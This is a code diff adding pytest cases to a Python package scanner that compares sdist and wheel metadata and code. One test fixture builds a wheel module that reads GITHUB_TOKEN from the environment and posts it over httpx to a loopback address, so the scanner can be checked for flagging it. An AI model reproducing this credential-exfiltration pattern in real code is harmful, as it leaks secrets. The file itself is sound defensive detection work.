@@ -35,6 +35,283 @@ def test_mismatched_project_or_version_is_reviewed_before_diff(make_sdist, make_
     assert findings[0].action == "REVIEW"
 
 
+def test_requires_dist_mismatch_is_reviewed(make_sdist, make_wheel) -> None:
+    sdist = make_sdist(
+        {
+            "PKG-INFO": (
+                "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\nRequires-Dist: safe-lib>=1\n"
+            )
+        }
+    )
+    wheel = make_wheel(
+        {
+            "demo-1.0.0.dist-info/METADATA": (
+                "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\nRequires-Dist: evil-lib>=1\n"
+            )
+        }
+    )
+    findings = compare_sdist_wheel(str(sdist), str(wheel))
+    mismatch = [item for item in findings if item.rule == "requires_dist_mismatch"]
+    assert len(mismatch) == 1
+    assert mismatch[0].action == "REVIEW"
+
+
+def test_requires_dist_semantic_normalization_avoids_false_mismatch(make_sdist, make_wheel) -> None:
+    sdist = make_sdist(
+        {
+            "PKG-INFO": (
+                "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\n"
+                "Requires-Dist: Demo_Pkg[Beta, alpha] ( >= 1.0, < 2.0 ) ; "
+                "python_version>='3.8' and extra==\"beta\"\n"
+            )
+        }
+    )
+    wheel = make_wheel(
+        {
+            "demo-1.0.0.dist-info/METADATA": (
+                "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\n"
+                "Requires-Dist: demo-pkg[alpha,beta]>=1.0,<2.0; "
+                "python_version >= \"3.8\" and extra == 'beta'\n"
+                "Requires-Dist: demo-pkg[alpha,beta]>=1.0,<2.0; "
+                "python_version >= \"3.8\" and extra == 'beta'\n"
+            )
+        }
+    )
+    assert not [
+        item
+        for item in compare_sdist_wheel(str(sdist), str(wheel))
+        if item.rule == "requires_dist_mismatch"
+    ]
+
+
+def test_requires_dist_direct_url_same_and_changed(make_sdist, make_wheel) -> None:
+    def pair(sdist_url: str, wheel_url: str):
+        sdist = make_sdist(
+            {
+                "PKG-INFO": (
+                    "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\n"
+                    "Requires-Dist: dep @  " + sdist_url + "  \n"
+                )
+            },
+            name="direct-sdist.tar.gz",
+        )
+        wheel = make_wheel(
+            {
+                "demo-1.0.0.dist-info/METADATA": (
+                    "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\n"
+                    "Requires-Dist: dep @ " + wheel_url + "\n"
+                )
+            },
+            name="direct-demo-1.0.0-py3-none-any.whl",
+        )
+        return sdist, wheel
+
+    sdist, wheel = pair("https://example.test/dep-1.tar.gz", "https://example.test/dep-1.tar.gz")
+    assert not [
+        item
+        for item in compare_sdist_wheel(str(sdist), str(wheel))
+        if item.rule == "requires_dist_mismatch"
+    ]
+    sdist, wheel = pair("https://example.test/dep-1.tar.gz", "https://example.test/dep-2.tar.gz")
+    findings = compare_sdist_wheel(str(sdist), str(wheel))
+    assert len([item for item in findings if item.rule == "requires_dist_mismatch"]) == 1
+
+
+def test_requires_dist_direct_url_internal_semicolon_preserves_marker(
+    make_sdist, make_wheel
+) -> None:
+    sdist = make_sdist(
+        {
+            "PKG-INFO": (
+                "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\n"
+                "Requires-Dist: dep @ https://e.test/a;b ; python_version>='3.11'\n"
+            )
+        },
+        name="semicolon-url.tar.gz",
+    )
+    wheel = make_wheel(
+        {
+            "demo-1.0.0.dist-info/METADATA": (
+                "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\n"
+                'Requires-Dist: dep @ https://e.test/a;b ; python_version >= "3.11"\n'
+            )
+        },
+        name="semicolon-url-demo-1.0.0-py3-none-any.whl",
+    )
+    assert not [
+        item
+        for item in compare_sdist_wheel(str(sdist), str(wheel))
+        if item.rule == "requires_dist_mismatch"
+    ]
+
+
+def test_requires_dist_direct_url_internal_semicolon_change_is_reviewed(
+    make_sdist, make_wheel
+) -> None:
+    def pair(sdist_url: str, wheel_url: str):
+        sdist = make_sdist(
+            {
+                "PKG-INFO": (
+                    "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\n"
+                    f"Requires-Dist: dep @ {sdist_url}\n"
+                )
+            },
+            name="semicolon-only.tar.gz",
+        )
+        wheel = make_wheel(
+            {
+                "demo-1.0.0.dist-info/METADATA": (
+                    "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\n"
+                    f"Requires-Dist: dep @ {wheel_url}\n"
+                )
+            },
+            name="semicolon-only-demo-1.0.0-py3-none-any.whl",
+        )
+        return sdist, wheel
+
+    sdist, wheel = pair("https://e.test/a;b", "https://e.test/a;b")
+    assert not [
+        item
+        for item in compare_sdist_wheel(str(sdist), str(wheel))
+        if item.rule == "requires_dist_mismatch"
+    ]
+    sdist, wheel = pair("https://e.test/a;b", "https://e.test/a;c")
+    assert [
+        item
+        for item in compare_sdist_wheel(str(sdist), str(wheel))
+        if item.rule == "requires_dist_mismatch"
+    ]
+
+
+def test_requires_dist_dynamic_semantics_for_25_and_26(make_sdist, make_wheel) -> None:
+    def pair(version: str, dynamic: str, wheel_requirements: str):
+        sdist = make_sdist(
+            {
+                "PKG-INFO": (
+                    f"Metadata-Version: {version}\nName: demo\nVersion: 1.0.0\n"
+                    f"{dynamic}Requires-Dist: base>=1\n"
+                )
+            },
+            name=f"dynamic-{version}.tar.gz",
+        )
+        wheel = make_wheel(
+            {
+                "demo-1.0.0.dist-info/METADATA": (
+                    f"Metadata-Version: {version}\nName: demo\nVersion: 1.0.0\n{wheel_requirements}"
+                )
+            },
+            name=f"dynamic-{version}-demo-1.0.0-py3-none-any.whl",
+        )
+        return sdist, wheel
+
+    sdist, wheel = pair("2.5", "Dynamic: Requires-Dist\n", "Requires-Dist: changed>=1\n")
+    assert not [
+        item
+        for item in compare_sdist_wheel(str(sdist), str(wheel))
+        if item.rule == "requires_dist_mismatch"
+    ]
+    sdist, wheel = pair(
+        "2.6", "Dynamic: Requires-Dist\n", "Requires-Dist: base>=1\nRequires-Dist: added>=1\n"
+    )
+    assert not [
+        item
+        for item in compare_sdist_wheel(str(sdist), str(wheel))
+        if item.rule == "requires_dist_mismatch"
+    ]
+    sdist, wheel = pair("2.6", "Dynamic: Requires-Dist\n", "Requires-Dist: changed>=1\n")
+    assert (
+        len(
+            [
+                item
+                for item in compare_sdist_wheel(str(sdist), str(wheel))
+                if item.rule == "requires_dist_mismatch"
+            ]
+        )
+        == 1
+    )
+
+
+def test_requires_dist_pre_22_and_missing_metadata_are_skipped(make_sdist, make_wheel) -> None:
+    sdist = make_sdist(
+        {"PKG-INFO": "Metadata-Version: 2.1\nName: demo\nVersion: 1.0.0\nRequires-Dist: old\n"},
+        name="pre22.tar.gz",
+    )
+    wheel = make_wheel(
+        {
+            "demo-1.0.0.dist-info/METADATA": (
+                "Metadata-Version: 2.1\nName: demo\nVersion: 1.0.0\nRequires-Dist: new\n"
+            )
+        },
+        name="pre22-demo-1.0.0-py3-none-any.whl",
+    )
+    assert not [
+        item
+        for item in compare_sdist_wheel(str(sdist), str(wheel))
+        if item.rule == "requires_dist_mismatch"
+    ]
+    sdist = make_sdist({"demo/__init__.py": ""}, name="missing-meta.tar.gz")
+    wheel = make_wheel({"demo/__init__.py": ""}, name="missing-meta-demo-1.0.0-py3-none-any.whl")
+    assert not [
+        item
+        for item in compare_sdist_wheel(str(sdist), str(wheel))
+        if item.rule == "requires_dist_mismatch"
+    ]
+
+
+def test_requires_dist_malformed_values_are_stable_and_safe(make_sdist, make_wheel) -> None:
+    def pair(sdist_value: str, wheel_value: str):
+        sdist = make_sdist(
+            {
+                "PKG-INFO": "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\nRequires-Dist: "
+                + sdist_value
+                + "\n"
+            },
+            name="malformed.tar.gz",
+        )
+        wheel = make_wheel(
+            {
+                "demo-1.0.0.dist-info/METADATA": (
+                    "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\nRequires-Dist: "
+                )
+                + wheel_value
+                + "\n"
+            },
+            name="malformed-demo-1.0.0-py3-none-any.whl",
+        )
+        return sdist, wheel
+
+    sdist, wheel = pair("not a valid requirement ???", "not a valid requirement ???")
+    assert not [
+        item
+        for item in compare_sdist_wheel(str(sdist), str(wheel))
+        if item.rule == "requires_dist_mismatch"
+    ]
+    sdist, wheel = pair("not a valid requirement ???", "not a valid requirement !!!")
+    findings = compare_sdist_wheel(str(sdist), str(wheel))
+    assert len([item for item in findings if item.rule == "requires_dist_mismatch"]) == 1
+
+
+def test_requires_dist_evidence_is_bounded_and_deterministic(make_sdist, make_wheel) -> None:
+    sdist_requirements = "".join(f"Requires-Dist: old-{index}\n" for index in range(20))
+    wheel_requirements = "".join(f"Requires-Dist: new-{index}\n" for index in range(20))
+    sdist = make_sdist(
+        {"PKG-INFO": "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\n" + sdist_requirements},
+        name="many.tar.gz",
+    )
+    wheel = make_wheel(
+        {
+            "demo-1.0.0.dist-info/METADATA": "Metadata-Version: 2.5\nName: demo\nVersion: 1.0.0\n"
+            + wheel_requirements
+        },
+        name="many-demo-1.0.0-py3-none-any.whl",
+    )
+    findings = compare_sdist_wheel(str(sdist), str(wheel))
+    mismatch = [item for item in findings if item.rule == "requires_dist_mismatch"]
+    assert len(mismatch) == 1
+    assert len(mismatch[0].snippet) <= 200
+    assert "+15개" in mismatch[0].snippet
+
+
 def test_project_name_separator_normalization_avoids_false_mismatch(make_sdist, make_wheel) -> None:
     source = "VALUE = 1\n"
     sdist = make_sdist(
@@ -158,6 +435,26 @@ def test_wheel_only_dangerous_python_is_denied(make_sdist, make_wheel) -> None:
     assert any(item.action == "DENY" for item in findings)
 
 
+def test_wheel_only_literal_dynamic_import_keeps_dangerous_module_handling(
+    make_sdist, make_wheel
+) -> None:
+    sdist = make_sdist({"demo/__init__.py": ""})
+    wheel = make_wheel(
+        {
+            "demo/__init__.py": "",
+            "demo/lazy.py": (
+                "import importlib\n"
+                "importlib.import_module('pydantic.fields')\n"
+                "importlib.import_module('requests')\n"
+            ),
+        }
+    )
+    findings = compare_sdist_wheel(str(sdist), str(wheel))
+    risky = [item for item in findings if item.rule == "wheel_only_risky_python"]
+    assert len(risky) == 1
+    assert risky[0].line == 3
+
+
 def test_wheel_only_credential_network_flow_is_denied(make_sdist, make_wheel) -> None:
     sdist = make_sdist({"demo/__init__.py": ""})
     wheel = make_wheel(
@@ -173,6 +470,27 @@ def test_wheel_only_credential_network_flow_is_denied(make_sdist, make_wheel) ->
     findings = compare_sdist_wheel(str(sdist), str(wheel))
     assert "wheel_only_credential_network" in _rules(findings)
     assert any(item.source and item.sink == "requests.post" for item in findings)
+
+
+def test_wheel_only_class_client_credential_network_flow_is_denied(make_sdist, make_wheel) -> None:
+    sdist = make_sdist({"demo/__init__.py": ""})
+    wheel = make_wheel(
+        {
+            "demo/__init__.py": "",
+            "demo/update.py": (
+                "import httpx\nimport os\n"
+                "class Api:\n"
+                "    def __init__(self):\n"
+                "        self.client = httpx.Client()\n"
+                "    def send(self):\n"
+                "        secret = os.getenv('GITHUB_TOKEN')\n"
+                "        self.client.post('http://127.0.0.1:1/', data=secret)\n"
+            ),
+        }
+    )
+    findings = compare_sdist_wheel(str(sdist), str(wheel))
+    assert "wheel_only_credential_network" in _rules(findings)
+    assert any(item.source and item.sink == "httpx.Client.post" for item in findings)
 
 
 def test_wheel_only_executable_pth_is_denied(make_sdist, make_wheel) -> None:
